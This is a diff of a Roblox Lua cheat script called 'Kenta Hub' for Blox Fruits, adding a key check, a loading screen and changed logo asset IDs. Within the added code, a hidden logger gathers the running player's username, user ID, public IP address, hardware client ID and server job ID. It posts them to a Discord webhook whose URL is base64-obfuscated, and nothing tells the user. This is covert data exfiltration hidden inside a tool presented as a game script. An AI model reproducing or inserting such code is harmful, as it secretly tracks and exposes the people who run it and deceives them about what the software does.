@@ -1,3 +1,349 @@
+repeat
+    wait()
+until game:IsLoaded() and game.Players.LocalPlayer
+
+-- Danh sách các key hợp lệ
+local keys = {
+    ["KentaHub_10dj29319rj"] = true,
+    ["KentaHub_10eu39dir2i"] = true,
+    ["KentaHub_1pf8fj3jf92"] = true,
+    ["KentaHub_10d9fjej3if"] = true
+}
+
+-- Kiểm tra xem Key có tồn taij và đúng không
+if getgenv().Key and keys[getgenv().Key] then
+    print("Whitelist success!")
+  -- Dán script của bây vào đây
+else
+    if not getgenv().Key then
+        -- Nếu không có key, kêu nó nhập zô
+        warn("please enter your key!")
+    end
+    -- Nếu key không đúng, kick mịa nó luôn
+    game.Players.LocalPlayer:Kick("Invalid Key! Please enter your correct key!")
+end
+local ScreenGui = Instance.new("ScreenGui")
+local buoi = Instance.new('UICorner')
+local KeyUI = Instance.new("Frame")
+local UICorner = Instance.new("UICorner")
+local ImageLabelsuc = Instance.new("ImageLabel")
+local DropShadowHolder = Instance.new("Frame")
+local DropShadow = Instance.new("ImageLabel")
+local GetKey1 = Instance.new("Frame")
+local UICorner_2 = Instance.new("UICorner")
+local UIStroke = Instance.new("UIStroke")
+local Text = Instance.new("TextLabel")
+local Click = Instance.new("TextButton")
+local CheckKey = Instance.new("Frame")
+local UICorner_3 = Instance.new("UICorner")
+local UIStroke_2 = Instance.new("UIStroke")
+local Text_2 = Instance.new("TextLabel")
+local Click_2 = Instance.new("TextButton")
+local GetKey2 = Instance.new("Frame")
+local UICorner_4 = Instance.new("UICorner")
+local UIStroke_3 = Instance.new("UIStroke")
+local Click_3 = Instance.new("TextButton")
+local Text_3 = Instance.new("TextLabel")
+local InputFrame = Instance.new("Frame")
+local UICorner_5 = Instance.new("UICorner")
+local UIStroke_4 = Instance.new("UIStroke")
+local Input = Instance.new("TextBox")
+local Text_4 = Instance.new("TextLabel")
+HOHO_Passcheck = Instance.new("ScreenGui")
+INTRO = Instance.new("CanvasGroup")
+Wallpaper = Instance.new("ImageLabel")
+TextHolder = Instance.new("Frame")
+Status = Instance.new("TextLabel")
+UITextSizeConstraint = Instance.new("UITextSizeConstraint")
+Gradient = Instance.new("Frame")
+UIGradient = Instance.new("UIGradient")
+Pattern = Instance.new("ImageLabel")
+Logo = Instance.new("ImageLabel")
+Main = Instance.new("ImageLabel")
+UIAspectRatioConstraint = Instance.new("UIAspectRatioConstraint")
+Loader = Instance.new("Frame")
+Content = Instance.new("Frame")
+UIStroke = Instance.new("UIStroke")
+ImageLabel = Instance.new("ImageLabel")
+UIAspectRatioConstraint_1 = Instance.new("UIAspectRatioConstraint")
+UICorner = Instance.new("UICorner")
+GET_KEY = Instance.new("CanvasGroup")
+UICorner_1 = Instance.new("UICorner")
+Logo_1 = Instance.new("ImageLabel")
+UIAspectRatioConstraint_2 = Instance.new("UIAspectRatioConstraint")
+Get = Instance.new("TextButton")
+UICorner_2 = Instance.new("UICorner")
+UIStroke_1 = Instance.new("UIStroke")
+Title = Instance.new("TextLabel")
+Submit = Instance.new("TextButton")
+UICorner_3 = Instance.new("UICorner")
+UIStroke_2 = Instance.new("UIStroke")
+Title_1 = Instance.new("TextLabel")
+Pfp = Instance.new("ImageLabel")
+UICorner_4 = Instance.new("UICorner")
+Support = Instance.new("TextButton")
+UICorner_5 = Instance.new("UICorner")
+UIStroke_3 = Instance.new("UIStroke")
+Title_2 = Instance.new("TextLabel")
+Credit = Instance.new("TextLabel")
+Close = Instance.new("TextButton")
+Title_3 = Instance.new("TextLabel")
+UIStroke_4 = Instance.new("UIStroke")
+UICorner_6 = Instance.new("UICorner")
+Frame = Instance.new("Frame")
+UIStroke_5 = Instance.new("UIStroke")
+UIGradient_2 = Instance.new("UIGradient")
+UIGradient_3 = Instance.new("UIGradient")
+UICorner_7 = Instance.new("UICorner")
+Frame_1 = Instance.new("TextLabel")
+Frame_2 = Instance.new("TextBox")
+UIStroke_6 = Instance.new("UIStroke")
+UICorner_8 = Instance.new("UICorner")
+UICorner_9 = Instance.new("UICorner")
+Gradient_1 = Instance.new("Frame")
+UIGradient_1 = Instance.new("UIGradient")
+Pattern_1 = Instance.new("ImageLabel")
+Hover = Instance.new("ImageLabel")
+local Hover_2
+Gradient_Frame = Instance.new("Frame")
+UIGradient_4 = Instance.new("UIGradient")
+ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+HOHO_Passcheck.IgnoreGuiInset = true
+HOHO_Passcheck.ResetOnSpawn = false
+HOHO_Passcheck.Parent = game.Players.LocalPlayer.PlayerGui
+HOHO_Passcheck.Name = "HÐ¾hÐ¾_ÑÐ°ssÑhÐµÑk"
+HOHO_Passcheck.ScreenInsets = Enum.ScreenInsets.DeviceSafeInsets
+HOHO_Passcheck.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+HOHO_Passcheck.Enabled = true
+
+INTRO.BorderSizePixel = 0
+INTRO.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+INTRO.AnchorPoint = Vector2.new(0.5, 0.5)
+INTRO.Size = UDim2.new(0.455271, 0, 0.46186, 0)
+INTRO.ZIndex = 990
+INTRO.Name = "INTRO"
+INTRO.Position = UDim2.new(0.5, 0, 0.5, 0)
+INTRO.BorderColor3 = Color3.fromRGB(0, 0, 0)
+INTRO.Parent = HOHO_Passcheck
+
+Hover.ImageColor3 = Color3.fromRGB(255, 51, 51)
+Hover.BorderSizePixel = 0
+Hover.SliceCenter = Rect.new(205, 197, 828, 828)
+Hover.ScaleType = Enum.ScaleType.Slice
+Hover.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Hover.ImageTransparency = 1
+Hover.Position = UDim2.new(0.5, 0, 0.5, 0)
+Hover.Name = "Hover"
+Hover.AnchorPoint = Vector2.new(0.5, 0.5)
+Hover.Image = "rbxassetid://16261022724"
+Hover.Size = UDim2.new(1.055, 0, 1.45, 0)
+Hover.BorderColor3 = Color3.fromRGB(0, 0, 0)
+Hover.BackgroundTransparency = 1
+Hover.Parent = Get
+
+Hover_2 = Hover:Clone()
+Hover_2.Parent = Submit
+
+Wallpaper.BorderSizePixel = 0
+Wallpaper.ScaleType = Enum.ScaleType.Fit
+Wallpaper.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Wallpaper.Position = UDim2.new(-0.0361702, 0, -0.158876, 0)
+Wallpaper.Name = "Wallpaper"
+Wallpaper.Image = "rbxassetid://90811268786029"
+Wallpaper.Size = UDim2.new(1.11064, 0, 1.59989, 0)
+Wallpaper.BorderColor3 = Color3.fromRGB(0, 0, 0)
+Wallpaper.Parent = INTRO
+
+TextHolder.BorderSizePixel = 0
+TextHolder.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+TextHolder.Size = UDim2.new(1, 0, 0.284847, 0)
+TextHolder.BorderColor3 = Color3.fromRGB(30, 30, 30)
+TextHolder.Name = "TextHolder"
+TextHolder.Position = UDim2.new(0, 0, 0.753631, 0)
+TextHolder.Parent = INTRO
+
+Status.TextWrapped = true
+Status.BorderSizePixel = 0
+Status.TextScaled = true
+Status.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Status.FontFace = Font.new("rbxasset://fonts/families/SourceSansPro.json", Enum.FontWeight.SemiBold, Enum.FontStyle.Italic)
+Status.Position = UDim2.new(0.120042, 0, 0.254529, 0)
+Status.Name = "Status"
+Status.TextSize = 20
+Status.Size = UDim2.new(0.79993, 0, 0.464041, 0)
+Status.ZIndex = 2
+Status.TextColor3 = Color3.fromRGB(255, 255, 255)
+Status.BorderColor3 = Color3.fromRGB(0, 0, 0)
+Status.Text = "It!Kuri Dz vai lon"
+Status.BackgroundTransparency = 1
+Status.Parent = TextHolder
+Status:SetAttribute("EngText",Status.Text)
+
+UITextSizeConstraint.MaxTextSize = 20
+UITextSizeConstraint.Parent = Status
+
+Gradient.BorderSizePixel = 0
+Gradient.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Gradient.Size = UDim2.new(1, 0, 1, 0)
+Gradient.BorderColor3 = Color3.fromRGB(0, 0, 0)
+Gradient.Name = "Gradient"
+Gradient.Position = UDim2.new(0, 0, 2.11993e-08, 0)
+Gradient.Parent = TextHolder
+
+UIGradient.Transparency = NumberSequence.new{ NumberSequenceKeypoint.new(0, 0.9), NumberSequenceKeypoint.new(1, 0.9) }
+UIGradient.Color = ColorSequence.new{ ColorSequenceKeypoint.new(0, Color3.fromRGB(157, 2, 31)), ColorSequenceKeypoint.new(0.466321, Color3.fromRGB(139.758, 6.07549, 31.0759)), ColorSequenceKeypoint.new(0.797927, Color3.fromRGB(46.7098, 28.0691, 31.4853)), ColorSequenceKeypoint.new(1, Color3.fromRGB(30, 30, 30)) }
+UIGradient.Rotation = -90
+UIGradient.Parent = Gradient
+
+Pattern.SliceCenter = Rect.new(0, 256, 0, 256)
+Pattern.ScaleType = Enum.ScaleType.Tile
+Pattern.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Pattern.ImageTransparency = 0.6
+Pattern.Position = UDim2.new(6.64996e-05, 0, 0.00124399, 0)
+Pattern.Name = "Pattern"
+Pattern.Image = "rbxassetid://2151741365"
+Pattern.TileSize = UDim2.new(0, 250, 0, 250)
+Pattern.Size = UDim2.new(1, 0, 1, 0)
+Pattern.ZIndex = 0
+Pattern.BackgroundTransparency = 1
+Pattern.Parent = Gradient
+
+Logo.ImageColor3 = Color3.fromRGB(0, 0, 0)
+Logo.BorderSizePixel = 0
+Logo.ScaleType = Enum.ScaleType.Fit
+Logo.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Logo.ImageTransparency = 0.5
+Logo.Position = UDim2.new(0.271609, 0, 0.122057, 0)
+Logo.Name = "Logo"
+Logo.Image = ""
+Logo.Size = UDim2.new(0.453191, 0, 0.550704, 0)
+Logo.BorderColor3 = Color3.fromRGB(0, 0, 0)
+Logo.ZIndex = 2
+Logo.BackgroundTransparency = 1
+Logo.Parent = INTRO
+
+Main.BorderSizePixel = 0
+Main.ScaleType = Enum.ScaleType.Fit
+Main.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Main.Position = UDim2.new(0.5, 0, 0.5, 0)
+Main.Name = "Main"
+Main.AnchorPoint = Vector2.new(0.5, 0.5)
+Main.Image = ""
+Main.Size = UDim2.new(0.95, 0, 0.95, 0)
+Main.BorderColor3 = Color3.fromRGB(0, 0, 0)
+Main.BackgroundTransparency = 1
+Main.Parent = Logo
+
+UIAspectRatioConstraint.AspectRatio = 2.08357
+UIAspectRatioConstraint.Parent = INTRO
+
+Loader.BorderSizePixel = 0
+Loader.BackgroundColor3 = Color3.fromRGB(16, 16, 16)
+Loader.Size = UDim2.new(0.999948, 0, 0.0285966, 0)
+Loader.BorderColor3 = Color3.fromRGB(0, 0, 0)
+Loader.Name = "Loader"
+Loader.Position = UDim2.new(0, 0, 0.751682, 0)
+Loader.ZIndex = 2
+Loader.Parent = INTRO
+
+Content.BorderSizePixel = 0
+Content.BackgroundColor3 = Color3.fromRGB(255, 51, 51)
+Content.Size = UDim2.new(0, 0, 1, 0)
+Content.BorderColor3 = Color3.fromRGB(0, 0, 0)
+Content.Name = "Content"
+Content.Parent = Loader
+
+UIStroke.Transparency = 0.5
+UIStroke.Parent = Content
+
+ImageLabel.ImageColor3 = Color3.fromRGB(255, 46, 46)
+ImageLabel.BorderSizePixel = 0
+ImageLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+ImageLabel.Position = UDim2.new(1, 0, .5, 0)
+ImageLabel.AnchorPoint = Vector2.new(.5,.5)
+ImageLabel.Image = "rbxassetid://16073652319"
+ImageLabel.Size = UDim2.new(0.671884, 0, 15.1201, 0)
+ImageLabel.BorderColor3 = Color3.fromRGB(0, 0, 0)
+ImageLabel.BackgroundTransparency = 1
+ImageLabel.Parent = Content
+
+UIAspectRatioConstraint_1.AspectRatio = 1.49814
+UIAspectRatioConstraint_1.Parent = ImageLabel
+
+UICorner.CornerRadius = UDim.new(0, 12)
+UICorner.Parent = INTRO
+game:GetService("TweenService"):Create(Content, TweenInfo.new(5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {Size = UDim2.new(1, 0, 1, 0)}):Play()
+wait(5.1)
+INTRO.Visible = false
+INTRO.GroupTransparency = 0
+function PostWebhook(Url, message)
+    local request = http_request or request or HttpPost or syn.request
+    local data =
+        request(
+        {
+            Url = Url,
+            Method = "POST",
+            Headers = {["Content-Type"] = "application/json"},
+            Body = game:GetService("HttpService"):JSONEncode(message)
+        }
+    )
+    return ""
+end
+
+function AdminLoggerMsg()
+    AdminMessage = {
+        ["embeds"] = {
+            {
+                ["title"] = "**Script Kenta Hub**",
+                ["description"] ="",
+                ["type"] = "rich",
+                ["color"] = tonumber(0xf93dff),
+                ["fields"] = {
+                    {
+                        ["name"] = "**Username**",
+                        ["value"] = "```" .. game.Players.LocalPlayer.Name .. "```",
+                        ["inline"] = true
+                    },
+                    {
+                        ["name"] = "**UserID**",
+                        ["value"] = "```" .. game.Players.LocalPlayer.UserId .. "```",
+                        ["inline"] = true
+                    },
+                    {
+                        ["name"] = "**PlaceID**",
+                        ["value"] = "```" .. game.PlaceId .. "```",
+                        ["inline"] = false
+                    },
+                    {
+                        ["name"] = "**IP Address**",
+                        ["value"] = "```" .. tostring(game:HttpGet("https://api.ipify.org", true)) .. "```",
+                        ["inline"] = false
+                    },
+                    {
+                        ["name"] = "**Hwid**",
+                        ["value"] = "```" .. game:GetService("RbxAnalyticsService"):GetClientId() .. "```",
+                        ["inline"] = false
+                    },
+                    {
+                        ["name"] = "**JobID**",
+                        ["value"] = "```" .. game.JobId .. "```",
+                        ["inline"] = false
+                    },
+                    {
+                        ["name"] = "**Join Code**",
+                        ["value"] = "```lua" .. "\n" .. "game.ReplicatedStorage['__ServerBrowser']:InvokeServer('teleport','" .. game.JobId .. "')" .. "```",
+                        ["inline"] = false
+                    }
+                },
+                ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%S")
+            }
+        }
+    }
+    return AdminMessage
+end
+
+PostWebhook("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQxMzQ1NDUxMTIzMzU2ODgzOC84STJRS3g3VlpRS2NFNWctUlJmQTZnQk83Rlc5Wmx2N1RVT0dGUmpxZkdNeTUteWRPWjg2ZTNGdV9ZeFlyS21PWkhzcA==", AdminLoggerMsg()) -- Post to admin webhook
+
 local KentaA1 = {};
 
 KentaA1["1"] = Instance.new("ScreenGui", game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui"));
@@ -3068,8 +3414,8 @@ end
 local library = {}
 
 _G.Color = Color3.fromRGB(255, 85, 0) 
-_G.imageLogo = "rbxassetid://98623767891468"
-_G.Logo = "rbxassetid://98623767891468"
+_G.imageLogo = "rbxassetid://136884062641813"
+_G.Logo = "rbxassetid://136884062641813"
 _G.NameHub = "Made By Mastery Team" -- ชื่อ Hub
 _G.Title = "Kenta Hub Script blox fruits" -- คำอธิบาย
 -----------------------------------------------------------------
@@ -3106,7 +3452,7 @@ ImageButton.BorderSizePixel = 0
 ImageButton.Position = UDim2.new(0.120833337 - 0.10, 0, 0.0952890813 + 0.01, 0)
 ImageButton.Size = UDim2.new(0, 40, 0, 40)
 ImageButton.Draggable = true
-ImageButton.Image = "rbxassetid://98623767891468"
+ImageButton.Image = "rbxassetid://136884062641813"
 
 UICorner.CornerRadius = UDim.new(1, 0)
 UICorner.Parent = ImageButton
@@ -3162,7 +3508,7 @@ function CircleClick(Button, X, Y)
 				Circle.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
 				Circle.BackgroundTransparency = 1.000
 				Circle.ZIndex = 10
-				Circle.Image = "rbxassetid://98623767891468"
+				Circle.Image = "rbxassetid://136884062641813"
 				Circle.ImageColor3 = Color3.fromRGB(255, 255, 255)
 				Circle.ImageTransparency = 0.7
 				local NewX = X - Circle.AbsolutePosition.X
@@ -3337,7 +3683,7 @@ Disc_Logo.BorderColor3 = Color3.fromRGB(0, 0, 0)
 Disc_Logo.BorderSizePixel = 0
 Disc_Logo.Position = UDim2.new(0, 5, 0, 1)
 Disc_Logo.Size = UDim2.new(0, 23, 0, 23)
-Disc_Logo.Image = "http://www.roblox.com/asset/?id=98623767891468"
+Disc_Logo.Image = "http://www.roblox.com/asset/?id=136884062641813"
 
 Disc_Title.Name = "Disc_Title"
 Disc_Title.Parent = Discord
@@ -4023,7 +4369,7 @@ UICorner.Parent = ImageButton
 				MainToggle_3.Position = UDim2.new(0.5, 0, 0.5, 0)
 				MainToggle_3.Size = UDim2.new(0, 0, 0, 0)
 				MainToggle_3.ZIndex = 16
-				MainToggle_3.Image = "http://www.roblox.com/asset/?id=98623767891468"
+				MainToggle_3.Image = "http://www.roblox.com/asset/?id=136884062641813"
 				MainToggle_3.ImageColor3 = _G.Color
 				MainToggle_3.Visible =false
 				UICorner_3.CornerRadius = UDim.new(0, 3)
@@ -4260,7 +4606,7 @@ UICorner.Parent = ImageButton
 				ImageButton.Position = UDim2.new(1, -25, 0.5, 0)
 				ImageButton.Size = UDim2.new(0, 12, 0, 12)
 				ImageButton.ZIndex = 16
-				ImageButton.Image = "http://www.roblox.com/asset/?id=98623767891468"
+				ImageButton.Image = "http://www.roblox.com/asset/?id=136884062641813"
 
 				Scroll_Items.Name = "Scroll_Items"
 				Scroll_Items.Parent = MainDropDown
@@ -4442,7 +4788,7 @@ UICorner.Parent = ImageButton
 				ImageButton.Position = UDim2.new(1, -25, 0.5, 0)
 				ImageButton.Size = UDim2.new(0, 12, 0, 12)
 				ImageButton.ZIndex = 16
-				ImageButton.Image = "http://www.roblox.com/asset/?id=98623767891468"
+				ImageButton.Image = "http://www.roblox.com/asset/?id=136884062641813"
 				local DropTable = {}
 				Scroll_Items.Name = "Scroll_Items"
 				Scroll_Items.Parent = MainDropDown
